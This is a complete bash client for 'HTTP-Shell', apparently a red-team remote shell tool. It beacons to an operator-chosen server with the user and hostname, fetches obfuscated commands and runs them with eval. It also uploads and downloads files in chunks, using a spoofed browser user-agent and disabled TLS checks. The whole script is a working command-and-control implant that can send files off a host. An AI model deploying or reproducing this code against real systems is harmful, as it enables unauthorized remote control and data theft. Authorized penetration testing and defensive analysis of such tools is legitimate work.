#!/bin/bash
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
server="$2"
sleeps="$4"
pwdnew="$(echo $PWD)"
cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
chunk_size=65536

# Help
if [[ $1 == *-h* ]] || [[ -z $2 ]]; then
   echo -e "\e[31m[!] Usage: ./HTTP-Client.sh -c [HOST:PORT] -s [SLEEP] (optional)\e[0m\n"
   exit 0
fi

# Functions
GetEnv() {
   usr="$(whoami | tr "[:upper:]" "[:lower:]")@$(cat /etc/hostname | tr "[:upper:]" "[:lower:]")"
   pwd="$pwdnew"
   echo "$usr!$pwd"
}

R64Encoder() {
   if [ "$1" = "-t" ]; then
      base64=$(echo -n "$2" | base64 | tr -d '\n' | tr "/+" "_-" | tr -d "=" | sed -e 's/[ \t]*//')
   elif [ "$1" = "-f" ]; then
      base64=$(base64 "$2" | tr -d '\n' | tr "+/" "-_" | sed "s/=*$//")
   fi
   revb64=$(echo "$base64" | rev)
   echo "$revb64"
}

R64Decoder() {
   if [ "$1" = "-t" ]; then
      base64=$(echo -n "$2" | rev | tr "-" "+" | tr "_" "/" )
      base64_len=$(( ${#base64} % 4 ))
      if [ "$base64_len" -eq 2 ]; then
         base64+="=="
      elif [ "$base64_len" -eq 3 ]; then
         base64+="="
      fi
      revb64=$(echo "$base64" | base64 -d)
      echo "$revb64"
   elif [ "$1" = "-f" ]; then
      base64=$(echo -n "$2" | rev | tr "-" "+" | tr "_" "/" )
      base64_len=$(( ${#base64} % 4 ))
      if [ "$base64_len" -eq 2 ]; then
         base64+="=="
      elif [ "$base64_len" -eq 3 ]; then
         base64+="="
      fi
      echo "$base64" | base64 -d
   fi
}

# Main
while true; do
  if [ "$sleeps" ]; then
    sleep "$sleeps"
  fi
  
  env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
  request1=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/Info" -d "Info: $getenv64")
  response=$(curl --max-time 600 -A "$cagent" -s -k "$server/api/v1/Client/Token")
  token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
  invoke64=$(R64Decoder -t "$token") ; param="Debug"

  if [ -n "$token" ]; then
      if [[ $invoke64 == "exit" ]]; then
         exit
      fi

      if [[ $invoke64 == upload* ]]; then
         file_path="${invoke64#upload }"
         file_path=$(echo "$file_path" | cut -d "!" -f 2)
         chunk_index=0
         tmpfile="/tmp/http-shell-upload-$$.tmp"
         : > "$tmpfile"
         while true; do
            file_request=$(curl --max-time 600 -A "$cagent" -s -k -X GET "$server/api/v1/Client/DownloadChunk?index=$chunk_index")
            if [[ $file_request == "FileChunkDone" ]]; then
               break
            fi
            if [[ $file_request == FileChunk:* ]]; then
               chunk_data="${file_request#FileChunk:}"
               is_last=$(echo "$chunk_data" | cut -d ':' -f2)
               chunk_payload=$(echo "$chunk_data" | cut -d ':' -f3-)
               printf '%s' "$chunk_payload" >> "$tmpfile"
               if [[ $is_last == "1" ]]; then
                  break
               fi
               chunk_index=$((chunk_index + 1))
            else
               break
            fi
         done
         if [[ ! -s "$tmpfile" ]]; then
            : > "$file_path"
         else
            rev < "$tmpfile" | tr "-" "+" | tr "_" "/" | base64 -d > "$file_path"
         fi
         rm -f "$tmpfile"
         unset invoke64 ; unset commandx
      fi

      if [[ $invoke64 == download* ]]; then
         file_path="${invoke64#download }"
         file_path=$(echo "$file_path" | cut -d "!" -f 1)
         tmpfile="/tmp/http-shell-dl-$$.b64"
         if R64Encoder -f "$file_path" | tr -d '\n' > "$tmpfile"; then
            content_len=$(wc -c < "$tmpfile")
            if [ "$content_len" -eq 0 ]; then
               download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/UploadChunk" -d "Chunk:0:1:")
            else
               chunk_index=0
               offset=0
               while [ "$offset" -lt "$content_len" ]; do
                  chunk_payload=$(dd if="$tmpfile" bs="$chunk_size" skip="$chunk_index" count=1 2>/dev/null)
                  is_last=0
                  if [ $((offset + chunk_size)) -ge "$content_len" ]; then
                     is_last=1
                  fi
                  download=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/UploadChunk" -d "Chunk:$chunk_index:$is_last:$chunk_payload")
                  chunk_index=$((chunk_index + 1))
                  offset=$((offset + chunk_size))
               done
            fi
         fi
         rm -f "$tmpfile"
         unset invoke64 ; unset commandx
      fi

      if [[ $invoke64 == cd* ]]; then
         new_dir="${invoke64#cd }"
         if [ "${new_dir:0:1}" != "/" ]; then
            new_dir="$pwdnew/$new_dir"
            new_dir=$(echo "$new_dir" | sed 's/["'\'']//g')
         fi
         if [ -d "$new_dir" ]; then
            cd "$new_dir"
            pwdnew=$(pwd)
            commandx="HTTPShellNull"
         else
            commandx="cd: $new_dir: No such file or directory"
            param="Error"
         fi

      else
         commandx=$(cd "$pwdnew" && eval "$invoke64" 2>&1)
         if [ $? -ne 0 ]; then
            param="Error"
         fi
      fi

      if [ -z "$commandx" ]; then
         commandx="HTTPShellNull"
      fi

      output64=$(R64Encoder -t "$commandx") ; path=$(echo "$param")
      request2=$(curl --max-time 600 -A "$cagent" -s -k -X POST "$server/api/v1/Client/$path" -d "$param: $output64")

   fi
done
